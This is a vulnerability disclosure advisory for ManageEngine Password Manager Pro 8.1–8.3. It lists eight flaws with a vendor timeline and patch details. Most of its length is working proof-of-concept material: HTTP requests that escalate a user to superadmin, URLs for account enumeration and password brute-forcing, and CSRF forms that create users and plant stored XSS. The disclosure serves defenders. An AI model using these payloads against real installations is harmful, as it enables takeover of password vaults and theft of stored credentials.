@@ -1,0 +1,388 @@
+[Systems Affected]
+   Product : ManageEngine Password Manager Pro
+   Company : ZOHO Corp.
+   Build Number : 8.1 to 8.3 and probably earlier versions
+   Affected Versions : 8102 to 8302 and probably earlier versions
+
+
+[Product Description]
+   Password Manager Pro is a secure vault for storing and managing
+shared sensitive information such as passwords, documents and digital
+identities of enterprises.
+
+
+[Vulnerabilities]
+   Multiple vulnerabilities were identified within this application:
+   1- Stored XSS in /AddMail.ve
+   2- Privilege escalation in /EditUser.do
+   3- Business Login Bypass in /EditUser.do
+   4- Password policy bypass in /jsp/xmlhttp/AjaxResponse.jsp
+   5- Horizontal privilege escalation in /jsp/xmlhttp/AjaxResponse.jsp
+   6- Resource's user enumeration in /jsp/xmlhttp/PasswdRetriveAjaxResponse.jsp
+   7- Password Bruteforce for resources accounts in
+/jsp/xmlhttp/AjaxResponse.jsp
+   8- Cross-Site Request Forgery
+
+
+[Advisory Timeline]
+   17/07/2015 - Discovery and vendor notification
+   17/07/2015 - ManageEngine responsed that they will notify their
+development team
+   13/10/2015 - ManageEngine informed that they have fixed these issue
+   14/10/2015 - Fixed Password Manager Pro build version 8300 has been released
+   15/10/2015 - Test on Beta build version 8300 was performed and
+confirm the fix of these issues 2, 4, 7 and part of issue 8
+   02/11/2015 - ManageEngine ask more time to fix the remaining issues
+before making this public
+   29/12/2015 - ManageEngine contacted for an update - No reply
+   12/01/2016 - ManageEngine contacted for an update - No reply
+   08/02/2016 - ManageEngine contacted for an update - small update provided
+   12/02/2016 - Last communication from ManageEngine
+   04/04/2016 - Public Disclosure
+
+
+[Patch Available]
+   Password Manager Pro Release 8.3 (8300) (Released on October, 2015)
+fix issues #2, #4, #7 and partially #8
+   Password Manager Pro Release 8.3 (8303) (Released on December 2015)
+fix issues #1, #3, #5 and #6
+
+
+[Exploit]
+   There is an exploit available that takes advantage of the Privilege
+Escalation vulnerability (Issue #2) and elevates a regular user to
+SuperAdmin, and then downloads the passwords and files stored within
+the application. The exploit code is available here
+   - https://github.com/s3bap3/pmp-exploit
+
+
+[Description of Vulnerabilities]
+
+(1) Stored XSS in /AddMail.ve.
+   This functionality is under the personal accounts stored in the
+application. However, as the page is also vulnerable to CSRF, an html
+form can be forged to create a personal account an exploit the XSS
+vulnerability. The affected parameter is "password", and the POST
+message to send is something like this
+
+   [PoC]
+      POST /AddMail.ve?SUBREQUEST=XMLHTTP HTTP/1.1
+
+      service=1&serviceurl=1&loginname=1&password=<!--+--+--><script>alert%28'XSS'%29;<%2fscript><!--+--+-->&spassword=&tags=1&Rule=Low&FORWARDURL=MailAccount.cc%3F
+
+
+(2) Privilege escalation in /EditUser.do that allows to do 2 things.
+   a- Hijack user's sessions by changing their emails and accessing
+the forgot password functionality.
+   The affected parameter is "EMAIL" from the /EditUser.do web page.
+Any user (even PASSWORD USER's role) could send a craft POST method
+like the one below in order to change the user email address, which is
+being used to generate a new user password when the previous one was
+forgotten. The only attribute that needs to be changed from one
+request to another is the LOGINID, which is a sequence number that
+represent the User numeric ID.
+
+   b- Escalate privileges by changing the user account status from
+Password user to superadmin.
+   By forging a similar request it is possible to raise our own
+privileged to become a privileged user. For example, the parameter
+"ROLE" can be changed to "Password Auditor" "Password Administrator"
+or even "Administrator " and become it. It is also possible to become
+a superAdmin by changing the parameter "superAdmin" from false to
+true. This will allow us to take control of the application and all
+the passwords stored on it. In order to become superAdmin, the user
+role needs to be Administrator. Both can be achieved by forging the
+same request. In this scenario there are two parameters to be aware
+of.
+   - USERID and LOGINID is the numeric account id to which the
+superadmin attribute will be granted (could be obtained from the login
+reply)
+   - USER is the username to which the superadmin attribute will be granted
+
+   [PoC]
+      POST /EditUser.do?SUBREQUEST=true HTTP/1.1
+      Content-Type: multipart/form-data;
+boundary=---------------------------20780287114832
+
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="isloginusersa"
+
+      false
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="superadminscope"
+
+      true
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="SERVERPORT"
+
+      7272
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="OLDROLE"
+
+      Administrator
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="USERID"
+
+      4
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="LOGINID"
+
+      4
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="USER"
+
+      username
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="OLDLANG"
+
+      en
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="EMAIL"
+
+      pwned@user.com
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="ROLE"
+
+      Administrator
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="superAdmin"
+
+      true
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="Rule"
+
+      Strong
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="DEPT"
+
+
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="LOCATION"
+
+
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="mobileaccess"
+
+      enable
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="UserCert"; filename=""
+      Content-Type: application/octet-stream
+
+
+      -----------------------------20780287114832
+      Content-Disposition: form-data; name="lang_code"
+
+      en
+      -----------------------------20780287114832--
+
+
+(3) Business Login Bypass in /EditUser.do
+   The application allows only the creation of certain amount of
+Administrator, based on the licences. However it is possible to create
+more administrators. In order to exploit this go to the user
+administration page, and edit a user id. Save the edition without
+making any modification and intercept that POST message. Modify both
+parameters, "OLDROLE" and "ROLE" with the role "Administrator", and
+the user role will be changed to this one. Every user can be converted
+to an administrator even if the license does not allow that much. The
+application only check the amount of administrators when "ROLE" is
+Administrator but "OLDROLE" is another one.
+
+
+(4) Password policy bypass in /jsp/xmlhttp/AjaxResponse.jsp
+   Every time a password for a user account or resource's user account
+is being changed, a request is sent to this path in order to validate
+the password against the password policy. Despite the fact the the
+password is being sent in the URL (this means it could be logged in
+any proxy or even in the browser), the policy against the password is
+being evaluated could by changed by modifying the parameter "Rule"
+from the value it currently has to "Low", in order to be evaluated
+with a lower policy. For example:
+
+   [PoC]
+      https://192.168.0.3:7272/jsp/xmlhttp/AjaxResponse.jsp?RequestType=validPassword&password=b&Rule=Low&AccName=a&ACCID=5
+      https://192.168.0.3:7272/jsp/xmlhttp/AjaxResponse.jsp?RequestType=validPassword&password=b&Rule=Low&AccName=a&AccName=5
+
+
+(5) Horizontal privilege escalation in /jsp/xmlhttp/AjaxResponse.jsp
+   When an administrator creates a Password Reset Listener, another
+administrator needs to approve it. The same happens when a Listener
+needs to be suspended. However this could be bypassed by creating and
+approving the listener by the same administrator. This could be
+achieved by forging a GET request like the following. The only
+parameter that needs to be changed is the "LISTENERID" which is a
+sequence number that represents the Listener.
+
+   [PoC]
+      Listener Approval
+      https://192.168.0.3:7272/jsp/xmlhttp/AjaxResponse.jsp?RequestType=toggleListenerStatus&LISTENERID=4&ISAPPROVED=false&LISTENERTYPE=1&SUBREQUEST=XMLHTTP
+
+      Listener Suspension
+      https://192.168.0.3:7272/jsp/xmlhttp/AjaxResponse.jsp?RequestType=toggleListenerStatus&LISTENERID=4&ISAPPROVED=true&LISTENERTYPE=1&SUBREQUEST=XMLHTTP
+
+
+(6) Resource's users enumeration in /jsp/xmlhttp/PasswdRetriveAjaxResponse.jsp.
+   It is possible to enumerate resource's user accounts by forging a
+GET request as follows. This URL allows, if a user has access, to
+retrieve the account password. However if a user does not have access,
+the error message changes if the user exists or not. The only
+parameters that needs to be modified are "Resource" and "Account".
+
+   [PoC]
+      https://192.168.56.101:7272/jsp/xmlhttp/PasswdRetriveAjaxResponse.jsp?RequestType=PasswordRetrived&resource=admin+resource&account=admin
+
+      The error messages identifies if the account exists for that resource.
+      Account exists: ____ACCESS___DENIED__
+      Resource/Account does not exists: FAILURE
+
+
+(7) Password Bruteforce for resources accounts in /jsp/xmlhttp/AjaxResponse.jsp
+   It is possible to enumerate resource's user passwords by forging a
+GET request as follows. This URL is used in order to validate a user
+password against the password policy specified. By being able to
+change the password policy it is possible to use the "Low" policy
+which does not allow to reuse the password that is currently setup for
+the user. If an error message that the password could not be reused
+appears, that indicate that the password is the current password for
+that account.
+   The only parameters that needs to be modified are "Password" and
+"ACCID", and ensure that the password policy "Rule" parameter is set
+to low.
+
+   [PoC]
+      https://192.168.56.101:7272/jsp/xmlhttp/AjaxResponse.jsp?RequestType=validPassword&password=2&Rule=Low&ACCID=8
+
+      The error messages identifies if the password is correct or not
+for every user account.
+      Password matches: "Password cannot be same as last 1 passwords"
+      Password does not match: "SUCCESS"
+      Account ID does not exists: "Error in validating password policy"
+
+
+(8) Cross-Site Request Forgery
+   The application is vulnerable to Cross-Site Request Forgery, which
+by sending specific POST messages it is possible create a user in the
+system (1), elevate privileges for a user (2)(4), and store a XSS in
+the user's personal passwords (3). Below are two PoC
+
+   [PoC]
+      User Creation
+      <html>
+         <body>
+            <form method="post"
+action="https://192.168.0.3:7272/AddUser.do"
+enctype="multipart/form-data">
+               <input value="true" name="superadminscope"
+type="hidden"><input value="true" type="hidden">
+               <input value="true" name="isloginusersa"
+type="hidden"><input value="true" type="hidden">
+               <input value="hacker" name="fname" type="hidden"><input
+value="true" type="hidden">
+               <input value="hacker" name="lname" type="hidden"><input
+value="true" type="hidden">
+               <input value="hacker" name="user" type="hidden"><input
+value="true" type="hidden">
+               <input value="same" name="rbutton" type="hidden"><input
+value="true" type="hidden">
+               <input value="Strong" name="Rule" type="hidden"><input
+value="true" type="hidden">
+               <input value="" name="spassword" type="hidden"><input
+value="true" type="hidden">
+               <input value="hacker@hacker.com" name="mail"
+type="hidden"><input value="true" type="hidden">
+               <input value="Password User" name="ROLE"
+type="hidden"><input value="true" type="hidden">
+               <input value="false" name="superAdmin"
+type="hidden"><input value="true" type="hidden">
+               <input value="" name="dept" type="hidden"><input
+value="true" type="hidden">
+               <input value="false" name="location"
+type="hidden"><input value="true" type="hidden">
+               <input value="enable" name="mobileaccess"
+type="hidden"><input value="true" type="hidden">
+               <input value="en" name="lang_code" type="hidden"><input
+value="true" type="hidden">
+               <input type="submit" value="Submit">
+            </form>
+         </body>
+      </html>
+
+      Privilege Escalation
+      <html>
+         <body>
+            <form method="post"
+action="https://192.168.0.3:7272/EditUser.do?SUBREQUEST=true"
+enctype="multipart/form-data">
+               <input value="true" name="isloginusersa"
+type="hidden"><input value="true" type="hidden">
+               <input value="true" name="superadminscope"
+type="hidden"><input value="true" type="hidden">
+               <input value="Administrator" name="OLDROLE"
+type="hidden"><input value="true" type="hidden">
+               <input value="613" name="USERID" type="hidden"><input
+value="true" type="hidden">
+               <input value="613" name="LOGINID" type="hidden"><input
+value="true" type="hidden">
+               <input value="hacker" name="USER" type="hidden"><input
+value="true" type="hidden">
+               <input value="en" name="OLDLANG" type="hidden"><input
+value="true" type="hidden">
+               <input value="hacker@hacker.com" name="EMAIL"
+type="hidden"><input value="true" type="hidden">
+               <input value="Administrator" name="ROLE"
+type="hidden"><input value="true" type="hidden">
+               <input value="true" name="superAdmin"
+type="hidden"><input value="true" type="hidden">
+               <input value="Strong" name="Rule" type="hidden"><input
+value="true" type="hidden">
+               <input value="" name="DEPT" type="hidden"><input
+value="true" type="hidden">
+               <input value="" name="LOCATION" type="hidden"><input
+value="true" type="hidden">
+               <input value="enable" name="mobileaccess"
+type="hidden"><input value="true" type="hidden">
+               <input value="en" name="lang_code" type="hidden"><input
+value="true" type="hidden">
+               <input type="submit" value="Submit">
+            </form>
+         </body>
+      </html>
+
+      Stored XSS
+      <html>
+         <body>
+            <form name="badform" method="post"
+action="https://192.168.0.3:7272/AddMail.ve?SUBREQUEST=XMLHTTP"
+accept-charset="UTF-8">
+               <input type="hidden" name="service" value="1" />
+               <input type="hidden" name="serviceurl" value="1" />
+               <input type="hidden" name="loginname" value="1" />
+               <input type="hidden" name="password" value="<!-- --
+--><script>alert('XSS');</script><!-- -- -->" />
+               <input type="hidden" name="spassword" value="" />
+               <input type="hidden" name="tags" value="" />
+               <input type="hidden" name="Rule" value="Low" />
+               <input type="submit" value="Submit">
+            </form>
+         </body>
+      </html>
+
+      Privilege Escalation
+      <html>
+         <body>
+            <form name="badform" method="post"
+action="https://192.168.0.3:7272/ChangeRoles.ve?SUBREQUEST=XMLHTTP"
+accept-charset="UTF-8">
+               <input type="hidden" name="SKIP_PREF" value="true" />
+               <input type="hidden" name="Admin" value="hacker" />
+               <input type="hidden" name="FORWARDURL"
+value="UserTabView.cc%3F" />
+               <input type="submit" value="Submit">
+            </form>
+         </body>
+      </html>
+
+--
+S3ba
+@s3bap3
+http://linkedin.com/in/s3bap3
